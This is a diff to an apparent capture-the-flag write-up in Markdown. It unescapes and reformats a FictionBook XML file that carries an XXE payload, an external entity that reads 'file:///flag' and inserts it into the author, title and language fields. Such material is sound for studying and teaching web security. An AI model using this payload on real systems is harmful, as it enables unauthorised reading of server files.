@@ -261,7 +261,8 @@ print()
 
 - XXE
 
-```
+{% raw %}
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///flag" >]>
@@ -269,9 +270,9 @@ print()
 <description>
     <title-info>
         <genre>antique</genre>
-        <author><first-name></first-name><last-name>\&xxe;</last-name></author>
-        <book-title>\&xxe;</book-title>
-        <lang>\&xxe;</lang>
+        <author><first-name></first-name><last-name>&xxe;</last-name></author>
+        <book-title>&xxe;</book-title>
+        <lang>&xxe;</lang>
     </title-info>
     <document-info>
         <author><first-name></first-name><last-name>Unknown</last-name></author>
@@ -293,6 +294,8 @@ print()
 
 </FictionBook>
 ```
+{% endraw %}
+
 ![](/images/2024/05/SJEp8y-VC.png)
 
 ### Hash Guesser
